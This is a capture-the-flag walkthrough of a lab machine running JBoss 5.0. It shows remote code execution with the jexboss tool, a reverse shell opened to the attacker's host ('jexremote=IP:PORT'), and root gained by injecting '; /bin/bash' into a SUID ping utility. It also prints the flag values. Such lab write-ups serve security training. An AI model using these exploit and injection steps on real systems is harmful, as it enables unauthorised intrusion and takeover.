# ENUMERATION
---



## OPEN PORTS
---

| PORT      | SERVICE                   |
| --------- | ------------------------- |
| 22/tcp    | SSH (OpenSSH 7.4)         |
| 80/tcp    | HTTP (Apache 2.4.6)       |
| 111/tcp   | RPCbind                   |
| 1098/tcp  | Java RMI                  |
| 1099/tcp  | Java Object Serialization |
| 3306/tcp  | MySQL/MariaDB             |
| 8008/tcp  | HTTP                      |
| 8083/tcp  | JBoss HTTP                |
| 40296/tcp | Unknown                   |
| 40982/tcp | Java RMI                  |
| 52306/tcp | Unknown                   |

We need to add `jacobtheboss.box` to `/etc/hosts`:

```
echo 'IP jacobtheboss.box' | sudo tee -a /etc/hosts
```


# RECONNAISSANCE
---


![Pasted image 20250408162521.png](../../IMAGES/Pasted%20image%2020250408162521.png)

Web application located at port 80 contains an admin login page and some other functionalities, I tried `XSS` on the search bar but it didn't work, I also tried `LFI` but same happened, seems like this is not the intended path to take, now, if we remember correctly, we got another website located at port 8080:

![Pasted image 20250408162626.png](../../IMAGES/Pasted%20image%2020250408162626.png)

We got something called `Jboss`, if we check the version:

```
whatweb http://jacobtheboss.box:8080

http://jacobtheboss.box:8080 [200 OK] Apache, Country[RESERVED][ZZ], HTTPServer[Apache-Coyote/1.1], IP[10.10.230.73], JBoss[5.0][JBossWeb-2.1], Title[Welcome to JBoss&trade;], X-Powered-By[Servlet 2.5; JBoss-5.0/JBossWeb-2.1]
```

We are dealing with `JBoss 5.0`, if we search for an exploit, we can find this:

![Pasted image 20250408162907.png](../../IMAGES/Pasted%20image%2020250408162907.png)

We got `RCE`, let's proceed to exploitation phase.



# EXPLOITATION
---

Due to us knowing that we got RCE, we can download the exploit and test:

```
Github: https://github.com/joaomatosf/jexboss.git
```

After downloading the script, we can use it with:

```
python jexboss.py -host http://jacobtheboss.box:8080
```


We can see this:

![Pasted image 20250408163415.png](../../IMAGES/Pasted%20image%2020250408163415.png)

There we go, we got the shell, as it says in the script, to get a reverse shell, we can simply type the following:

```
jexremote=IP:PORT
```

If we check our listener:

![Pasted image 20250408163529.png](../../IMAGES/Pasted%20image%2020250408163529.png)

We got the connection, let's start the privilege escalation phase.


# PRIVILEGE ESCALATION
---

First step is stabilizing our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250408163630.png](../../IMAGES/Pasted%20image%2020250408163630.png)

We can read user flag now:

```
[jacob@jacobtheboss /]$ cat /home/jacob/user.txt
f4d491f280de360cc49e26ca1587cbcc
```

If we check for SUID 4000 binaries, we find this:

```
[jacob@jacobtheboss /]$ find / -perm -4000 2>/dev/null
/usr/bin/pingsys
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chage
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
```

We got a few that may be interesting but after testing all of them, the only one that I could find some info was `pingsys`

![Pasted image 20250408164534.png](../../IMAGES/Pasted%20image%2020250408164534.png)

Which means that in order to get root, we can do the following:

```
/usr/bin/pingsys '127.0.0.1; /bin/bash'
```

![Pasted image 20250408164651.png](../../IMAGES/Pasted%20image%2020250408164651.png)

There we go, we got the root shell and can finally read `root.txt`:

```
[root@jacobtheboss /]# cat /root/root.txt
29a5641eaa0c01abe5749608c8232806
```

![Pasted image 20250408164733.png](../../IMAGES/Pasted%20image%2020250408164733.png)

